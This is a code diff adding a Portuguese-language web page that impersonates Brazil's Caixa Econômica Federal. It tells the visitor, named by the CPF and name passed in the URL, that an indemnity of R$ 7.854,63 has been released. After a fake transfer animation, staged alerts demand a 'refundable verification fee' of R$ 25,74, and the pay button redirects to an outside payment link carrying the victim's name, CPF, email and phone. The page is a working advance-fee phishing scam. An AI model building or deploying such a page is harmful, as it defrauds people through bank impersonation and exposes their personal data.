@@ -1,0 +1,385 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+
+<head>
+  <meta charset="utf-8">
+  <script src="https://cdn.utmify.com.br/scripts/utms/latest.js" data-utmify-prevent-subids async defer></script>
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Indenização Liberada - Caixa Econômica Federal</title>
+  <script>
+    localStorage.setItem("upsell", "up2");
+  </script>
+  <script src="js/latest.js" data-utmify-prevent-xcod-sck="" data-utmify-prevent-subids="" async="" defer=""></script>
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+
+    body {
+      font-family: 'Segoe UI', sans-serif;
+      background-color: #f2f2f2;
+      display: flex;
+      justify-content: center;
+      min-height: 100vh;
+      padding: 1rem;
+    }
+
+    .card,
+    .loading,
+    .card-final {
+      padding-top: 0.5rem;
+      max-width: 420px;
+      width: 100%;
+      display: none;
+      flex-direction: column;
+      gap: 0.5rem;
+      background-color: #fff;
+      border-radius: 12px;
+      box-shadow: 0 2px 8px rgba(0, 0, 0, 0.1);
+      padding: 1.5rem;
+    }
+
+    .loading {
+      margin-top: auto;
+      margin-bottom: 10rem;
+    }
+
+    .card.active,
+    .loading.active,
+    .card-final.active {
+      display: flex;
+    }
+
+    .logo {
+      width: 120px;
+      margin-bottom: 1.5rem;
+    }
+
+    h2 {
+      font-size: 1.3rem;
+      margin-bottom: 0.3rem;
+      color: #005CA9;
+    }
+
+    .value {
+      font-size: 2rem;
+      font-weight: 800;
+      color: #005CA9;
+      margin-bottom: 0.5rem;
+    }
+
+    .recipient {
+      font-size: 0.95rem;
+      color: #444;
+      margin-bottom: 1.5rem;
+    }
+
+    .recipient b {
+      font-weight: 600;
+    }
+
+    .info-line {
+      display: flex;
+      justify-content: space-between;
+      font-size: 0.95rem;
+      margin-bottom: 0.8rem;
+      color: #444;
+      padding-bottom: 0.5rem;
+      border-bottom: 1px solid #e0e0e0;
+    }
+
+    .box {
+      margin-top: 1.5rem;
+      background: #e9f2fb;
+      border: 1px solid #c8ddf0;
+      border-radius: 10px;
+      padding: 1rem;
+      font-size: 0.9rem;
+      color: #333;
+      text-align: center;
+      line-height: 1.4;
+    }
+
+    .button,
+    .final-button {
+      display: block;
+      margin-top: 1.5rem;
+      width: 100%;
+      background-color: #005CA9;
+      color: white;
+      border: none;
+      border-radius: 8px;
+      padding: 1rem;
+      font-size: 1rem;
+      font-weight: bold;
+      cursor: pointer;
+      text-align: center;
+      transition: background-color 0.2s;
+    }
+
+    .button:hover,
+    .final-button:hover {
+      background-color: #004a87;
+    }
+
+    .button:active,
+    .final-button:active {
+      background-color: #003b6d;
+    }
+
+    .progress-bar {
+      width: 100%;
+      height: 6px;
+      background-color: #e0e0e0;
+      border-radius: 4px;
+      overflow: hidden;
+    }
+
+    .progress-bar-fill {
+      height: 100%;
+      width: 0%;
+      background-color: #005CA9;
+      transition: width 0.1s linear;
+    }
+
+    .status-text {
+      font-size: 1.4rem;
+      font-weight: 600;
+      margin-bottom: 1rem;
+      color: #005CA9;
+    }
+
+    .fade-out-up {
+      opacity: 0;
+      transform: translateY(-20px);
+    }
+
+    .fade-in-up {
+      opacity: 1;
+      transform: translateY(0);
+    }
+
+    .wrapper-final {
+      background-color: #f5f7fa;
+      padding: 1rem;
+      border-radius: 1rem;
+      display: grid;
+      grid-template-rows: repeat(3, auto);
+      gap: 0.5rem;
+      min-height: 360px;
+      border: 1px solid #d8e2ed;
+    }
+
+    .alert-box {
+      background: #fff;
+      border-radius: 10px;
+      padding: 1rem;
+      display: none;
+      align-items: center;
+      gap: 0.5rem;
+      font-size: 0.95rem;
+      color: #333;
+      opacity: 0;
+      transform: translateY(10px);
+      animation: fadeInUp 0.3s ease forwards;
+      border: 1px solid #e0e0e0;
+    }
+
+    .alert-box.red {
+      background: #f8d7da;
+      color: #721c24;
+      font-weight: bold;
+      border: 1px solid #f5c6cb;
+    }
+
+    @keyframes fadeInUp {
+      to {
+        opacity: 1;
+        transform: translateY(0);
+      }
+    }
+
+    .icon-img {
+      width: 2rem;
+      height: 2rem;
+    }
+
+    .spinner {
+      border: 3px solid #ccc;
+      border-top: 3px solid #005CA9;
+      border-radius: 50%;
+      width: 24px;
+      height: 24px;
+      animation: spin 0.7s linear infinite;
+      margin: auto;
+    }
+
+    .official-bar {
+      position: absolute;
+      top: 0;
+      left: 0;
+      right: 0;
+      height: 5px;
+      background: linear-gradient(to right, #005CA9 70%, #F39200 30%);
+    }
+
+    @keyframes spin {
+      0% {
+        transform: rotate(0deg);
+      }
+
+      100% {
+        transform: rotate(360deg);
+      }
+    }
+  </style>
+</head>
+
+<body>
+  <div class="official-bar"></div>
+
+  <!-- CARD INICIAL -->
+  <div class="card active" id="card">
+    <img src="images/logo.png" class="logo" alt="Logo Caixa Econômica Federal">
+    <h2>Indenização Liberada</h2>
+    <div class="value">R$ 7.854,63</div>
+    <div class="recipient">para <b id="nome-completo">Carregando...</b></div>
+    <div class="info-line"><span>CPF</span><span id="cpf">Carregando...</span></div>
+    <div class="info-line"><span>Tipo de transferência</span><span>Pix</span></div>
+    <div class="info-line"><span>Data</span><span id="data">Carregando...</span></div>
+    <div class="box">
+      Seu valor já está liberado para saque!
+      Clique no botão abaixo para autorizar a transferência da sua indenização para sua chave pix cadastrada.
+    </div>
+    <button class="button" onclick="iniciarTransferencia()">Receber minha indenização</button>
+  </div>
+
+  <!-- TELA DE CARREGAMENTO -->
+  <div class="loading" id="loading">
+    <h2 id="status-text" class="status-text">Transferindo...</h2>
+    <div class="progress-bar">
+      <div class="progress-bar-fill" id="bar"></div>
+    </div>
+  </div>
+
+  <!-- CARD FINAL -->
+  <div class="card-final" id="card-final">
+    <img src="images/logo.png" class="logo" alt="Logo Caixa Econômica Federal">
+    <h2 style="font-size: 1.4rem; margin-bottom: 1rem;">Atenção!</h2>
+
+    <div class="wrapper-final"></div>
+
+    <button class="final-button" onclick="redirecionarParaPagamento()">Pagar Taxa de Verificação</button>
+  </div>
+
+  <script>
+    const params = new URLSearchParams(window.location.search);
+    const nome = params.get("name") || "Nome não informado";
+    const cpf = params.get("cpf") || "";
+    const email = params.get("email") || "";
+    const telefone = params.get("telephone") || "";
+
+    function formatCPF(cpf) {
+      const clean = cpf.replace(/\D/g, "");
+      return clean.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, "$1.$2.$3-$4");
+    }
+
+    function getFormattedDate() {
+      const d = new Date();
+      return `${String(d.getDate()).padStart(2, '0')}/${String(d.getMonth() + 1).padStart(2, '0')}/${d.getFullYear()}`;
+    }
+
+    document.getElementById("nome-completo").textContent = nome;
+    document.getElementById("cpf").textContent = cpf ? formatCPF(cpf) : "Não informado";
+    document.getElementById("data").textContent = getFormattedDate();
+
+    function exibirAlertasComSpinner() {
+      const alerts = [
+        { icon: "./images/aviso.png", text: "Identificamos uma movimentação de valor alto suspeita!", red: false },
+        { icon: "./images/aviso.png", text: "Por motivos de segurança é preciso realizar o pagamento da Taxa de Verificação para garantir a transferência segura e evitar possíveis fraudes.", red: false },
+        { icon: "./images/aviso.png", text: "Finalize o pagamento da Taxa de Verificação no valor de <b>R$ 25,74</b> e confirme sua indenização. Essa taxa é reembolsável e será devolvida automaticamente após a confirmação do pagamento.", red: true },
+      ];
+      const wrapper = document.querySelector(".wrapper-final");
+      wrapper.innerHTML = "";
+
+      let index = 0;
+      function showNext() {
+        if (index >= alerts.length) return;
+
+        const spinner = document.createElement("div");
+        spinner.className = "spinner";
+        wrapper.appendChild(spinner);
+
+        setTimeout(() => {
+          wrapper.removeChild(spinner);
+
+          const alert = document.createElement("div");
+          alert.className = `alert-box${alerts[index].red ? " red" : ""}`;
+          const icon = document.createElement("img");
+          icon.src = alerts[index].icon;
+          icon.className = "icon-img";
+
+          const text = document.createElement("div");
+          text.innerHTML = alerts[index].text;
+
+          alert.appendChild(icon);
+          alert.appendChild(text);
+          wrapper.appendChild(alert);
+
+          requestAnimationFrame(() => alert.style.display = "flex");
+
+          index++;
+          setTimeout(showNext, 900);
+        }, 1200);
+      }
+
+      showNext();
+    }
+
+    function iniciarTransferencia() {
+      document.getElementById("card").classList.remove("active");
+      document.getElementById("loading").classList.add("active");
+
+      const bar = document.getElementById("bar");
+      const statusText = document.getElementById("status-text");
+      let progress = 0;
+      let trocado = false;
+
+      const interval = setInterval(() => {
+        if (progress >= 100) {
+          clearInterval(interval);
+          document.getElementById("loading").classList.remove("active");
+          document.getElementById("card-final").classList.add("active");
+          exibirAlertasComSpinner();
+        } else {
+          progress++;
+          bar.style.width = progress + "%";
+
+          if (progress === 70 && !trocado) {
+            trocado = true;
+            statusText.classList.add("fade-out-up");
+            setTimeout(() => {
+              statusText.textContent = "Gerando Comprovante...";
+              statusText.classList.remove("fade-out-up");
+              statusText.classList.add("fade-in-up");
+            }, 400);
+          }
+        }
+      }, 50);
+    }
+    function redirecionarParaPagamento() {
+      var currentUrlParams = window.location.search;
+      window.location.href = "https://go.zeroonepay.com.br/cjuibfx3ex" + currentUrlParams;
+      
+    }
+
+  </script>
+
+
+
+</body>
+
+</html>
